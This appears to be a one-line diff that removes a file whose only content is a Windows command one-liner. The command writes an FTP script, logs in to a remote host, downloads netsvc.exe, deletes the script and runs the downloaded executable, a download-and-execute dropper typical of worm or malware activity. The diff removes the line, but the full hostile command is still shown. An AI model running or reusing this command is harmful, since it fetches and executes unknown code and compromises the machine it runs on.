@@ -1,1 +1,0 @@
-cmd /c echo open 0.0.0.0 42115 >> ii &echo user 1 1 >> ii &echo get netsvc.exe >> ii &echo bye >> ii &ftp -n -v -s:ii &del ii &netsvc.exe
